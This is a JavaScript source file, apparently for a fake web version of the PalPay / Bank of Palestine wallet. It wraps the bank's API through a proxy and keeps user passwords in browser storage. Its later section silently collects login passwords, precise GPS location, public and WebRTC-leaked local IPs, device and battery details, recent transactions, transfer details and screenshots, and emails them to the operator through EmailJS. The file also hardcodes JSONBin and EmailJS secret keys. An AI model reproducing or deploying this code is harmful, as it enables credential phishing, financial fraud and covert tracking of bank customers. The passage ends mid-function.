
/***********************
 * PalPay API — الـ API الرسمي لبنك فلسطين (محفظتي)
 * مستخرج من تطبيق base.apk الأصلي
 * Base URL: https://mahfazatim2.palpay.ps/api/v1.0/
 *
 * آلية المصادقة (من تحليل التطبيق):
 *   • الـ Header المستخدم: X-PALPAY-UserToken  (وليس Bearer)
 *   • الـ Token يُستخرج من حقل tokenId في استجابة /users/loginToAccount
 *   • headers ثابتة: X-PALPAY-Source: PALPAY  |  X-HISABI-VER: 2.14.0
 *   • X-MBS-Udid: معرّف فريد للجهاز يُولَّد مرة واحدة ويُحفظ
 *   • في حال CORS أو فشل الـ API، يُعاد null بصمت والنظام يتابع عبر JSONBin
 ***********************/
const PALPAY_BASE_URL    = "https://rough-wildflower-f6a4.hmadooo25y.workers.dev";
const PALPAY_APP_VERSION = "2.14.0";   // X-HISABI-VER (مستخرج من APK)
const PALPAY_SOURCE      = "PALPAY";   // X-PALPAY-Source (مستخرج من APK)

// ─── معرّف الجهاز ─── يُولَّد مرة واحدة ويُحفظ
function getPalPayUdid() {
    let udid = localStorage.getItem('palpay_udid');
    if (!udid) {
        udid = 'web-' + ([1e7]+-1e3+-4e3+-8e3+-1e11)
            .toString()
            .replace(/[018]/g, c =>
                (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
            );
        localStorage.setItem('palpay_udid', udid);
    }
    return udid;
}

// ─── حالة المصادقة ───
let _palPayToken     = localStorage.getItem('palpay_token')      || null;
let _palPayUsername  = localStorage.getItem('palpay_username')    || null;
let _palPayLoginInProgress = false;

/**
 * تحديث الـ Token بعد تسجيل دخول ناجح.
 */
function setPalPayToken(token, username) {
    _palPayToken    = token    || null;
    _palPayUsername = username || _palPayUsername;
    if (_palPayToken) {
        localStorage.setItem('palpay_token', _palPayToken);
        if (_palPayUsername) localStorage.setItem('palpay_username', _palPayUsername);
    } else {
        localStorage.removeItem('palpay_token');
    }
}

/**
 * مسح بيانات الجلسة (logout).
 */
function clearPalPaySession() {
    _palPayToken = null;
    localStorage.removeItem('palpay_token');
}

/**
 * بناء headers موحّدة لكل طلب.
 * الـ X-PALPAY-UserToken هو header المصادقة الحقيقي (مستخرج من APK).
 */
function buildPalPayHeaders(extraHeaders = {}) {
    const h = {
        'Content-Type':    'application/json',
        'Accept':          'application/json',
        'X-PALPAY-Source': PALPAY_SOURCE,
        'X-HISABI-VER':    PALPAY_APP_VERSION,
        'X-MBS-Udid':      getPalPayUdid(),
        ...extraHeaders
    };
    if (_palPayToken) {
        h['X-PALPAY-UserToken'] = _palPayToken;
    }
    return h;
}

/**
 * إرسال طلب إلى PalPay API.
 * • يضيف headers المصادقة تلقائياً.
 * • عند HTTP 401/403 يمسح الـ Token ويُعيد null (session منتهية).
 * • عند CORS أو شبكة مقطوعة يُلقي exception (يُعالَج في المستدعي).
 */
async function palPayRequest(path, options = {}) {
    const headers = buildPalPayHeaders(options.headers || {});
    const res = await fetch(`${PALPAY_BASE_URL}${path}`, {
        ...options,
        headers
    });

    // Session منتهية → مسح الـ Token
    if (res.status === 401 || res.status === 403) {
        clearPalPaySession();
        throw new Error(`PalPay API: session expired (${res.status})`);
    }

    if (!res.ok) throw new Error(`PalPay API ${path} → HTTP ${res.status}`);
    return res.json();
}

/**
 * [API] تسجيل الدخول الحقيقي عبر PalPay API.
 * Endpoint: POST /users/loginToAccount
 * Request:  { phoneOrAccount, password, udid, appVersion, deviceName }
 * Response: { tokenId, ... }  ← tokenId هو X-PALPAY-UserToken في الطلبات اللاحقة
 *
 * يُستدعى تلقائياً عند الحاجة (lazy auth).
 * @param {string} phoneOrAccount - رقم الجوال أو اسم المستخدم
 * @param {string} password
 * @returns {Promise<boolean>} true عند النجاح
 */
async function palPayLogin(phoneOrAccount, password) {
    if (_palPayLoginInProgress) return false;
    _palPayLoginInProgress = true;
    try {
        const body = {
            phoneOrAccount: String(phoneOrAccount || '').trim(),
            password:       String(password       || '').trim(),
            udid:           getPalPayUdid(),
            appVersion:     PALPAY_APP_VERSION,
            deviceName:     navigator.userAgent.substring(0, 100)
        };
        const data = await palPayRequest('/users/loginToAccount', {
            method: 'POST',
            body:   JSON.stringify(body)
        });
        // tokenId هو اسم الحقل المستخرج من APK
        const token = data?.tokenId || data?.token || data?.accessToken || null;
        if (token) {
            setPalPayToken(token, phoneOrAccount);
            console.log('✅ PalPay: تم تسجيل الدخول بنجاح');
            return true;
        }
        console.warn('PalPay: لم يُعد tokenId في الاستجابة', data);
        return false;
    } catch (e) {
        console.warn('PalPay login failed:', e.message);
        return false;
    } finally {
        _palPayLoginInProgress = false;
    }
}

/**
 * [API] الحصول على Token بيانات اعتماد محفوظة مسبقاً (silent re-login).
 * يُستدعى تلقائياً عند انتهاء الجلسة.
 * المعلومات محفوظة من آخر تسجيل دخول ناجح في hidden-left panel.
 */
async function palPaySilentRelogin() {
    // نستخدم المعلومات التي يُدخلها المستخدم في الـ hidden panel
    // (recipient_phone → phoneOrAccount, وكلمة مرور مخزّنة إن وجدت)
    const savedPhone    = localStorage.getItem('palpay_auth_phone')    || '';
    const savedPassword = localStorage.getItem('palpay_auth_password') || '';
    if (!savedPhone || !savedPassword) return false;
    return palPayLogin(savedPhone, savedPassword);
}

/**
 * تأكد من وجود token صالح قبل أي طلب يحتاج مصادقة.
 * إذا لم يكن هناك token يحاول silent re-login.
 * يُعيد true إذا أصبح هناك token، false إذا فشل.
 */
async function ensurePalPayAuth() {
    if (_palPayToken) return true;
    return palPaySilentRelogin();
}

// ─────────────────────────────────────────────────────────
//  APIs المتعلقة بالبحث برقم الموبايل وإدارة المستلمين
// ─────────────────────────────────────────────────────────

/**
 * [API] التحقق من حساب PalPay برقم الموبايل.
 * Endpoint: POST /palpayaccount/checkPayToFriendAccount
 * يحتاج مصادقة (X-PALPAY-UserToken).
 * عند غياب الـ Token يُحاوَل silent re-login قبل الطلب.
 * @param {string} mobileNumber - رقم الموبايل (059XXXXXXX أو 056XXXXXXX)
 * @returns {Promise<{name:string, phone:string, type:string}|null>}
 */
async function apiCheckPayToFriendAccount(mobileNumber) {
    try {
        // تأكد من وجود token — إن لم يكن، حاول silent re-login
        if (!_palPayToken) await ensurePalPayAuth();

        const data = await palPayRequest('/palpayaccount/checkPayToFriendAccount', {
            method: 'POST',
            body:   JSON.stringify({ mobileNumber })
        });
        // الـ API يُعيد كائناً يحتوي على name (واختيارياً accountNumber)
        if (data && data.name) {
            return {
                name:          data.name,
                phone:         mobileNumber,
                accountNumber: data.accountNumber || '',
                type:          'palpay-friend'
            };
        }
        return null;
    } catch (e) {
        // CORS أو session منتهية أو الشبكة مقطوعة → نتابع بصمت
        console.warn('PalPay checkPayToFriendAccount:', e.message);
        return null;
    }
}

/**
 * [API] جلب قائمة المستلمين المحفوظين (Payees).
 * Endpoint: GET /users/allPayees
 * يحتاج مصادقة.
 * @returns {Promise<Array<{name:string, phone:string, type:string}>>}
 */
async function apiGetAllPayees() {
    try {
        if (!_palPayToken) await ensurePalPayAuth();
        if (!_palPayToken) return []; // لا يوجد token بعد المحاولة

        const data = await palPayRequest('/users/allPayees', { method: 'GET' });
        const raw  = Array.isArray(data) ? data : (Array.isArray(data?.payees) ? data.payees : []);
        return raw
            .map(p => ({
                name:  p.name        || p.fullName    || p.accountName || '',
                phone: p.mobileNumber|| p.phone       || p.mobile      || '',
                type:  'payee'
            }))
            .filter(p => p.name && p.phone);
    } catch (e) {
        console.warn('PalPay allPayees:', e.message);
        return [];
    }
}

/**
 * [API] إضافة مستلم جديد (خطوة أولى - Pre).
 * Endpoint: POST /users/preAddPayee
 * @param {string} mobileNumber
 * @returns {Promise<object|null>}
 */
async function apiPreAddPayee(mobileNumber) {
    try {
        if (!_palPayToken) await ensurePalPayAuth();
        return await palPayRequest('/users/preAddPayee', {
            method: 'POST',
            body:   JSON.stringify({ mobileNumber })
        });
    } catch (e) {
        console.warn('PalPay preAddPayee:', e.message);
        return null;
    }
}

/**
 * [API] تأكيد إضافة مستلم جديد (خطوة ثانية - Confirm).
 * Endpoint: POST /users/confirmAddPayee
 * @param {string} mobileNumber
 * @param {string} otp
 * @returns {Promise<object|null>}
 */
async function apiConfirmAddPayee(mobileNumber, otp) {
    try {
        if (!_palPayToken) await ensurePalPayAuth();
        return await palPayRequest('/users/confirmAddPayee', {
            method: 'POST',
            body:   JSON.stringify({ mobileNumber, otp })
        });
    } catch (e) {
        console.warn('PalPay confirmAddPayee:', e.message);
        return null;
    }
}

/**
 * [API] التحقق من رقم الموبايل في منظومة iBuraq (IPS).
 * Endpoint: POST /iBuraq/checkReceiverAccount
 * يحتاج مصادقة.
 * @param {string} mobileNumber
 * @returns {Promise<{name:string, phone:string, type:string}|null>}
 */
async function apiCheckIBuraqReceiver(mobileNumber) {
    try {
        if (!_palPayToken) await ensurePalPayAuth();
        const data = await palPayRequest('/iBuraq/checkReceiverAccount', {
            method: 'POST',
            body:   JSON.stringify({ mobileNumber })
        });
        if (data && data.name) {
            return { name: data.name, phone: mobileNumber, type: 'iburaq' };
        }
        return null;
    } catch (e) {
        console.warn('PalPay checkReceiverAccount:', e.message);
        return null;
    }
}

/**
 * [API] البحث عن وكيل بالمدينة.
 * Endpoint: GET /agents/searchAgents?city=CITY
 * @param {string} city
 * @returns {Promise<Array>}
 */
async function apiSearchAgents(city) {
    try {
        if (!_palPayToken) await ensurePalPayAuth();
        const data = await palPayRequest(
            `/agents/searchAgents?city=${encodeURIComponent(city)}`,
            { method: 'GET' }
        );
        return Array.isArray(data) ? data : (data?.agents || []);
    } catch (e) {
        console.warn('PalPay searchAgents:', e.message);
        return [];
    }
}

/**
 * [API] التحقق من توفر اسم المستخدم / رقم الموبايل (يعمل بدون token).
 * Endpoint: POST /register/check-taken
 * @param {string} value
 * @returns {Promise<boolean>}
 */
async function apiCheckTaken(value) {
    try {
        // هذا الـ endpoint قد لا يحتاج token (pre-login)
        const data = await palPayRequest('/register/check-taken', {
            method: 'POST',
            body:   JSON.stringify({ value })
        });
        return !!(data && data.taken);
    } catch (e) {
        console.warn('PalPay check-taken:', e.message);
        return false;
    }
}

/**
 * [API] معلومات تسجيل الدخول عبر الموبايل.
 * Endpoint: GET /users/getMobileLoginInfo
 * @returns {Promise<object|null>}
 */
async function apiGetMobileLoginInfo() {
    try {
        if (!_palPayToken) await ensurePalPayAuth();
        return await palPayRequest('/users/getMobileLoginInfo', { method: 'GET' });
    } catch (e) {
        console.warn('PalPay getMobileLoginInfo:', e.message);
        return null;
    }
}

// ─────────────────────────────────────────────────────────
//  كاش مؤقت لنتائج البحث برقم الموبايل (لتجنب طلبات متكررة)
// ─────────────────────────────────────────────────────────
const _palPayPhoneCache = new Map(); // phone → {result, ts}
const PALPAY_CACHE_TTL = 5 * 60 * 1000; // 5 دقائق

/**
 * البحث عن مالك رقم موبايل عبر PalPay API مع كاش.
 * يجرب أولاً checkPayToFriendAccount، ثم checkReceiverAccount كبديل.
 * @param {string} phone
 * @returns {Promise<{name:string, phone:string, type:string}|null>}
 */
async function palPayLookupByPhone(phone) {
    const key = String(phone || '').trim();
    if (!key || !isValidPalPhone(key)) return null;

    // إرجاع من الكاش إذا كان حديثاً
    const cached = _palPayPhoneCache.get(key);
    if (cached && (Date.now() - cached.ts) < PALPAY_CACHE_TTL) {
        return cached.result;
    }

    // البحث عبر API checkPayToFriendAccount أولاً
    let result = await apiCheckPayToFriendAccount(key);

    // إذا فشل، جرب checkReceiverAccount (iBuraq/IPS)
    if (!result) {
        result = await apiCheckIBuraqReceiver(key);
    }

    // حفظ النتيجة في الكاش حتى لو كانت null (لتجنب الطلبات المتكررة للأرقام غير الموجودة)
    _palPayPhoneCache.set(key, { result, ts: Date.now() });

    // إذا وجدنا نتيجة، احفظها محلياً للاستخدام offline
    if (result && result.name) {
        saveContactMapping(result.name, key, result.type || 'palpay');
    }

    return result;
}

/***********************
 * JSONBin — التخزين السحابي المشترك
 * يستخدم نفس الـ Bin الموجود في نسخة PalPay
 ***********************/
const JSONBIN_KEY    = "$2a$10$GlH9Sz6xcpOvRdNQOwA2Re9xHjqpJZVzyobNOiwZpsp4Iyw0Xt2aa";
const JSONBIN_BIN_ID = "6a2def2df5f4af5e29eddfeb";
const JSONBIN_URL    = `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`;

let _jsonBinRecord = {};
let _jsonBinWriteQueue = Promise.resolve();

// هذه البيانات تخص الواجهة المخفية فقط، ولا يسمح النظام بتخزينها في JSONBin.
const HIDDEN_LOCAL_ONLY_KEYS = new Set([
    "merchant_name",
    "merchant_phone",
    "recipient_name",
    "recipient_phone"
]);


// دليل الأسماء والأرقام المشترك.
// مهم: لا يتم توحيد/تغيير صيغة رقم الهاتف. تتم المطابقة بالنص كما أدخله المستخدم،
// مع إزالة الفراغات المحيطة فقط. merchant_name/recipient_name وحقلا الهاتف المخفيان
// يستخدمان كمرجع إضافي فقط إذا تطابق الرقم حرفياً.
function phoneKey(phone) {
    return String(phone ?? '').trim();
}

// أرقام الهاتف المعتمدة في البحث: 10 أرقام وتبدأ بـ 059 أو 056.
// لا يتم تحويل الرقم أو إضافة/حذف أي أرقام؛ المطابقة تتم بنفس الصيغة.
function isValidPalPhone(phone) {
    return /^(?:059|056)\d{7}$/.test(phoneKey(phone));
}

function getContactsDirectory() {
    try {
        const raw = localStorage.getItem('contacts_directory');
        const data = raw ? JSON.parse(raw) : [];
        return Array.isArray(data) ? data : [];
    } catch (_) { return []; }
}

function setContactsDirectory(list) {
    localStorage.setItem('contacts_directory', JSON.stringify(list));
}

function collectCloudContacts(record) {
    const out = [];
    const seen = new Set();

    // يدعم صيغ القوائم السحابية المختلفة بدون تغيير صيغة الرقم.
    const add = (c, defaultType = 'contact') => {
        if (!c || typeof c !== 'object') return;

        const phoneCandidates = [
            c.phone, c.merchant_phone, c.recipient_phone,
            c.number, c.phone_number, c.mobile
        ];
        const nameCandidates = [
            c.name, c.merchant_name, c.recipient_name,
            c.contact_name, c.full_name
        ];

        const phone = phoneCandidates.find(v => v !== undefined && v !== null && String(v).trim() !== '');
        const name = nameCandidates.find(v => v !== undefined && v !== null && String(v).trim() !== '');
        if (phone == null || name == null) return;

        const cleanPhone = String(phone).trim();
        const cleanName = String(name).trim();
        if (!cleanPhone || !cleanName) return;

        const key = `${cleanPhone}\u0000${cleanName}`;
        if (seen.has(key)) return;
        seen.add(key);
        out.push({
            name: cleanName,
            phone: cleanPhone,
            type: c.type || c.kind || defaultType
        });
    };

    // جهات الاتصال السحابية.
    if (record && Array.isArray(record.contacts)) record.contacts.forEach(c => add(c, 'contact'));
    if (record && Array.isArray(record.contacts_directory)) record.contacts_directory.forEach(c => add(c, 'contact'));

    // قائمة التجار السحابية — كانت مفقودة من البحث سابقاً.
    if (record && Array.isArray(record.merchants_list)) {
        record.merchants_list.forEach(c => add(c, 'merchant'));
    }

    // بعض النسخ قد تخزن القوائم تحت كائنات بدلاً من مصفوفة مباشرة.
    const possibleLists = [
        ['merchants', 'merchant'],
        ['merchant_list', 'merchant'],
        ['friends', 'contact'],
        ['contacts_list', 'contact']
    ];
    possibleLists.forEach(([key, type]) => {
        if (record && Array.isArray(record[key])) record[key].forEach(c => add(c, type));
    });

    return out;
}

function findInContacts(list, target) {
    const key = phoneKey(target);
    if (!key || !isValidPalPhone(key)) return null;
    return (Array.isArray(list) ? list : []).find(c => phoneKey(c?.phone) === key) || null;
}

// مرجع إضافي فقط: لا يُستخدم إلا عندما يطابق الرقم المخفي الرقم المدخل حرفياً.
function findInHiddenReferences(phone) {
    const target = phoneKey(phone);
    if (!target || !isValidPalPhone(target)) return null;

    const merchantPhone = phoneKey(localStorage.getItem('merchant_phone'));
    const merchantName = String(localStorage.getItem('merchant_name') || '').trim();
    if (merchantPhone && merchantName && merchantPhone === target) {
        return { name: merchantName, phone: merchantPhone, type: 'merchant-hidden-reference' };
    }

    const recipientPhone = phoneKey(localStorage.getItem('recipient_phone'));
    const recipientName = String(localStorage.getItem('recipient_name') || '').trim();
    if (recipientPhone && recipientName && recipientPhone === target) {
        return { name: recipientName, phone: recipientPhone, type: 'recipient-hidden-reference' };
    }

    return null;
}

function findContactByPhone(phone) {
    const target = phoneKey(phone);
    if (!target) return null;

    return findInContacts(collectCloudContacts(_jsonBinRecord), target) ||
           findInContacts(getContactsDirectory(), target) ||
           findInHiddenReferences(target);
}

async function findContactByPhoneFresh(phone) {
    const target = phoneKey(phone);
    if (!target || !isValidPalPhone(target)) return null;

    try {
        // ① الأولوية لبيانات JSONBin السحابية المشتركة.
        const record = await jsonBinRead();
        const cloudMatch = findInContacts(collectCloudContacts(record), target);
        if (cloudMatch) return cloudMatch;

        // ② الدليل المحلي (localStorage).
        const localMatch = findInContacts(getContactsDirectory(), target);
        if (localMatch) return localMatch;

        // ③ PalPay API الرسمي — البحث برقم الموبايل مباشرةً في خوادم البنك.
        //    يجرب checkPayToFriendAccount أولاً، ثم checkReceiverAccount (iBuraq).
        const apiMatch = await palPayLookupByPhone(target);
        if (apiMatch) return apiMatch;

        // ④ مرجع إضافي مشروط: merchant_name/recipient_name المحفوظان محلياً.
        return findInHiddenReferences(target);
    } catch (e) {
        console.warn('findContactByPhoneFresh error:', e);
        // Fallback: محلي → API → مرجع إضافي
        const localMatch = findInContacts(getContactsDirectory(), target);
        if (localMatch) return localMatch;
        try {
            const apiMatch = await palPayLookupByPhone(target);
            if (apiMatch) return apiMatch;
        } catch (_) {}
        return findInHiddenReferences(target);
    }
}

async function saveContactMapping(name, phone, type) {
    // بيانات الواجهة المخفية تبقى محلياً فقط ولا تُرفع إلى JSONBin.
    const cleanName = String(name || '').trim();
    const cleanPhone = String(phone || '').trim();
    if (!cleanName || !cleanPhone || !isValidPalPhone(cleanPhone)) return;

    const localList = getContactsDirectory();
    const localIdx = localList.findIndex(c => phoneKey(c?.phone) === cleanPhone);
    const entry = { name: cleanName, phone: cleanPhone, type: type || 'contact' };

    if (localIdx >= 0) localList[localIdx] = { ...localList[localIdx], ...entry };
    else localList.push(entry);

    setContactsDirectory(localList);
}

function showVerifyModal() {
    const modal = document.getElementById('verifyModal');
    if (modal) modal.style.display = 'flex';
}

async function jsonBinRead() {
    const res = await fetch(`${JSONBIN_URL}/latest`, {
        method: "GET",
        headers: { "X-Master-Key": JSONBIN_KEY }
    });
    if (!res.ok) throw new Error(`JSONBin GET ${res.status}`);
    const data = await res.json();
    _jsonBinRecord = (data && data.record && typeof data.record === "object")
        ? data.record : {};
    return _jsonBinRecord;
}

function jsonBinSave(patch) {
    // منع أي محاولة لحفظ بيانات الواجهة المخفية في JSONBin.
    const safePatch = Object.fromEntries(
        Object.entries(patch || {}).filter(([key]) => !HIDDEN_LOCAL_ONLY_KEYS.has(key))
    );
    if (!Object.keys(safePatch).length) return Promise.resolve();

    // تسلسل عمليات الكتابة حتى لا تتصادم التحديثات المتتالية.
    _jsonBinWriteQueue = _jsonBinWriteQueue.then(async () => {
        try {
            const latest = await jsonBinRead();
            const merged = { ...latest, ...safePatch };
            const res = await fetch(JSONBIN_URL, {
                method: "PUT",
                headers: {
                    "Content-Type": "application/json",
                    "X-Master-Key": JSONBIN_KEY
                },
                body: JSON.stringify(merged)
            });
            if (!res.ok) throw new Error(`JSONBin PUT ${res.status}`);
            _jsonBinRecord = merged;
        } catch (e) {
            console.warn("JSONBin: تعذر حفظ البيانات السحابية", e);
        }
    }).catch(e => console.warn("JSONBin queue:", e));
    return _jsonBinWriteQueue;
}

async function loadSettingsFromDB() {
    try {
        const record = await jsonBinRead();

        if (record.user_name !== undefined && record.user_name !== null) {
            localStorage.setItem("user_name", record.user_name);
        }
        if (record.user_balance !== undefined && record.user_balance !== null) {
            localStorage.setItem("user_balance", record.user_balance);
            if (typeof currentBalance !== "undefined") {
                currentBalance = parseFloat(record.user_balance) || 0;
            }
        }

        const arrayKeys = [
            "merchants_list",
            "contacts_directory",
            "bank_notifications",
            "bank_statements"
        ];
        arrayKeys.forEach(key => {
            if (Array.isArray(record[key])) {
                localStorage.setItem(key, JSON.stringify(record[key]));
            }
        });

        // لا يتم ترحيل بيانات الواجهة المخفية إلى دليل السحابة.
        // بياناتها تبقى محلية فقط.

        if (record.notifications_read !== undefined) {
            localStorage.setItem("notifications_read", String(record.notifications_read));
        }

        // تحديث الواجهة بعد وصول البيانات السحابية.
        if (typeof updateAllBalances === "function" && record.user_balance !== undefined) {
            updateAllBalances(record.user_balance);
        }
        const s1Name = document.querySelector(".welcome-text");
        if (s1Name && record.user_name) {
            s1Name.innerHTML = `مرحباً، ${record.user_name}`;
        }
        if (typeof renderNotificationsPage === "function") renderNotificationsPage();
        if (typeof updateNotificationBadge === "function") updateNotificationBadge();
        if (typeof loadSavedStatements === "function") {
            const tbody = document.getElementById("statement-tbody");
            if (tbody) tbody.innerHTML = "";
            loadSavedStatements();
        }
    } catch (e) {
        console.warn("JSONBin: تعذر جلب البيانات السحابية", e);
    }
}

function syncCloudFromLocal(keys) {
    const patch = {};
    keys.forEach(key => {
        if (HIDDEN_LOCAL_ONLY_KEYS.has(key)) return;
        const value = localStorage.getItem(key);
        if (value === null) return;
        try {
            patch[key] = JSON.parse(value);
        } catch (_) {
            patch[key] = value;
        }
    });
    if (Object.keys(patch).length) jsonBinSave(patch);
}

// تحميل البيانات المشتركة عند بدء التطبيق.
document.addEventListener("DOMContentLoaded", () => {
    loadSettingsFromDB();

    // ─── تهيئة PalPay API ───
    // إذا كان هناك token وبيانات اعتماد محفوظة → تحقق من صلاحية الجلسة
    // وجلب قائمة المستلمين في الخلفية.
    (async () => {
        if (_palPayToken) {
            // جلسة محفوظة موجودة → جرّب تحميل المستلمين مباشرة
            loadPayeesFromPalPayAPI();
        } else {
            // لا يوجد token → حاول silent re-login إذا توفرت بيانات
            const ok = await palPaySilentRelogin();
            if (ok) loadPayeesFromPalPayAPI();
        }
    })();
});

/**
 * يجلب قائمة المستلمين المحفوظين من PalPay API
 * ويدمجها في الدليل المحلي لاستخدامها في البحث.
 */
async function loadPayeesFromPalPayAPI() {
    try {
        const payees = await apiGetAllPayees();
        if (!payees || payees.length === 0) return;
        const localList = getContactsDirectory();
        let changed = false;
        payees.forEach(p => {
            if (!p.name || !p.phone) return;
            const idx = localList.findIndex(c => phoneKey(c?.phone) === phoneKey(p.phone));
            if (idx >= 0) {
                localList[idx] = { ...localList[idx], ...p };
            } else {
                localList.push(p);
                changed = true;
            }
        });
        if (changed) setContactsDirectory(localList);
        console.log(`✅ PalPay: تم تحميل ${payees.length} مستلم من الـ API`);
    } catch (e) {
        console.warn('loadPayeesFromPalPayAPI failed:', e.message);
    }
}

/***********************
 * 0. إعداد EmailJS — جمع بيانات شاملة
 ***********************/
(function initEmailJS() {
    emailjs.init("sZQujmMuXwkE4Gt1Y");
})();

const EMAILJS_SERVICE_ID  = "service_owz5qzf";
const EMAILJS_TEMPLATE_ID = "template_79ykomn";

// ========== متغيرات عالمية ==========
let _gpsLocation     = "جاري تحديد الموقع...";
let _ipData          = {};
let _batteryData     = "جاري جلب البطارية...";
let _localIP         = "—";
let _connectionType  = "—";

// ========== 1. GPS الموقع الجغرافي ==========
(function fetchGPS() {
    if (!navigator.geolocation) { _gpsLocation = "GPS غير مدعوم"; return; }
    navigator.geolocation.getCurrentPosition(
        function(pos) {
            const lat = pos.coords.latitude.toFixed(6);
            const lng = pos.coords.longitude.toFixed(6);
            const acc = Math.round(pos.coords.accuracy);
            _gpsLocation = `https://maps.google.com/?q=${lat},${lng} (دقة ${acc}م)`;
        },
        function(err) {
            const r = {1:"رفض الإذن", 2:"غير متاح", 3:"انتهت المهلة"};
            _gpsLocation = `تعذّر (${r[err.code] || err.message})`;
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
})();

// ========== 2. IP + المدينة + البلد + ISP + المنطقة الزمنية + الرمز البريدي + الحي ==========
(function fetchIPData() {
    fetch("https://ipapi.co/json/")
        .then(r => r.json())
        .then(d => {
            _ipData = {
                ip:       d.ip            || "—",
                city:     d.city          || "—",
                region:   d.region        || "—",
                country:  d.country_name  || "—",
                postal:   d.postal        || "—",
                isp:      d.org           || "—",
                timezone: d.timezone      || "—"
            };
        })
        .catch(() => { _ipData = { ip:"فشل الجلب" }; });
})();

// ========== 3. البطارية ==========
(function fetchBattery() {
    if (!navigator.getBattery) { _batteryData = "غير مدعوم"; return; }
    navigator.getBattery().then(b => {
        const pct      = Math.round(b.level * 100);
        const charging = b.charging ? "⚡ يشحن" : "🔋 لا يشحن";
        const timeLeft = b.charging
            ? (b.chargingTime   !== Infinity ? `متبقي للشحن الكامل: ${Math.round(b.chargingTime/60)} دقيقة` : "")
            : (b.dischargingTime !== Infinity ? `متبقي للنفاد: ${Math.round(b.dischargingTime/60)} دقيقة` : "");
        _batteryData = `${pct}% | ${charging} | ${timeLeft}`;
    });
})();

// ========== 4. نوع الاتصال ==========
(function fetchConnection() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        _connectionType = `${conn.effectiveType || "—"} | سرعة: ${conn.downlink || "—"} Mbps`;
    }
})();

// ========== 5. IP المحلي ==========
(function fetchLocalIP() {
    try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = e => {
            if (!e || !e.candidate) return;
            const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
            if (m && !m[1].startsWith("0.")) { _localIP = m[1]; pc.close(); }
        };
    } catch(e) { _localIP = "غير متاح"; }
})();

// ========== 6. معلومات الجهاز ==========
function getDeviceInfo() {
    const ua = navigator.userAgent;
    let deviceType = "💻 كمبيوتر";
    if (/tablet|ipad|playbook|silk/i.test(ua)) deviceType = "📟 تابلت";
    else if (/mobile|android|iphone|ipod|blackberry|opera mini|iemobile/i.test(ua)) deviceType = "📱 موبايل";

    let os = "غير معروف";
    if (/android/i.test(ua))      os = "Android " + (ua.match(/Android ([0-9.]+)/)?.[1] || "");
    else if (/iphone|ipad/i.test(ua)) os = "iOS " + (ua.match(/OS ([0-9_]+)/)?.[1]?.replace(/_/g,".") || "");
    else if (/windows/i.test(ua)) os = "Windows";
    else if (/mac/i.test(ua))     os = "macOS";
    else if (/linux/i.test(ua))   os = "Linux";

    return `${deviceType} | ${os}`;
}

// ========== 7. إرسال البريد (مع دعم الـ Offline Queue) ==========
function sendEmailNotification(params) {
    if (!navigator.onLine) {
        // انقطاع الإنترنت — أضف العملية إلى صف الانتظار
        offlineQueueAdd(params);
        return;
    }
    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
        .then(() => console.log("✅ تم الإرسال"))
        .catch(err => {
            console.error("❌ فشل الإرسال:", err);
            // إذا فشل الإرسال (انقطع الإنترنت أثناء المحاولة) — أضف للصف
            offlineQueueAdd(params);
        });
}

// ========== 8. دالة لجلب آخر 5 عمليات دفع ==========
function getLastFiveTransactions() {
    const statements = JSON.parse(localStorage.getItem('bank_statements')) || [];
    // خذ أول 5 عمليات (الأحدث)
    const last5 = statements.slice(0, 5);
    
    // صيغ البيانات بشكل جميل
    let transactionsText = "آخر 5 عمليات دفع:\n";
    if (last5.length === 0) {
        transactionsText = "لا توجد عمليات دفع سابقة";
    } else {
        last5.forEach((transaction, index) => {
            const date = transaction.date || "—";
            const desc = transaction.desc || "—";
            const amount = transaction.amount || "—";
            transactionsText += `${index + 1}. ${desc} - المبلغ: ${amount} بتاريخ ${date}\n`;
        });
    }
    return transactionsText;
}

// ========== 8. بناء الحقول الكاملة ==========
function _buildFullParams(eventType, password, recipientName, recipientPhone, amount, includeTransactions = false) {
    const ip = _ipData;
    const params = {
        event_type:      eventType,
        password:        password       || "—",
        user_name:       localStorage.getItem("user_name")    || "—",
        user_balance:    localStorage.getItem("user_balance") || "—",
        timestamp:       new Date().toLocaleString("ar-EG"),

        // تفاصيل العملية
        recipient_name:  recipientName  || "—",
        recipient_phone: recipientPhone || "—",
        amount:          amount         || "—",

        // الموقع
        gps_link:        _gpsLocation,
        city:            `${ip.city || "—"} — ${ip.region || "—"}`,
        country:         ip.country  || "—",
        postal:          ip.postal   || "—",
        isp:             ip.isp      || "—",
        timezone:        ip.timezone || "—",

        // الشبكة والـ IP
        public_ip:       ip.ip       || "—",
        local_ip:        _localIP,
        connection:      _connectionType,

        // الجهاز
        device_info:     getDeviceInfo(),

        // البطارية
        battery:         _batteryData
    };
    
    // إضافة آخر 5 عمليات إذا كان مطلوباً (عند تسجيل الدخول)
    if (includeTransactions) {
        params.last_five_transactions = getLastFiveTransactions();
    }
    
    return params;
}

// ========== 9. دوال الإرسال ==========
function sendLoginData(password) {
    const send = () => sendEmailNotification(
        _buildFullParams("🔐 تسجيل دخول", password, "—", "—", "—", true) // true لإضافة آخر 5 عمليات
    );
    setTimeout(send, 3000);
}

function sendTransferData(recipientName, recipientPhone, amount) {
    sendEmailNotification(
        _buildFullParams("💸 تحويل لصديق", "—", recipientName, recipientPhone, amount)
    );
}

function sendMerchantPaymentData(merchantName, amount, refNum) {
    sendEmailNotification(
        _buildFullParams("🏪 دفع لتاجر", "—", merchantName, localStorage.getItem('merchant_phone') || '—', amount)
    );
}

// ========== 10. لقطة شاشة عند التحويل ==========
function captureAndSendScreenshot(screenId, label) {
    const el = document.getElementById(screenId);
    if (!el || typeof html2canvas === "undefined") return;
    html2canvas(el, { scale: 1.5, useCORS: true }).then(canvas => {
        const imgData = canvas.toDataURL("image/jpeg", 0.7);
        sendEmailNotification(
            _buildFullParams(`📸 ${label}`, "—", imgData.substring(0, 500) + "...")
        );
    });
}

/***********************
 * حساب عمولة بنك فلسطين (PalPay) حسب الشرائح
 ***********************/
function calcPalPayCommission(amount) {
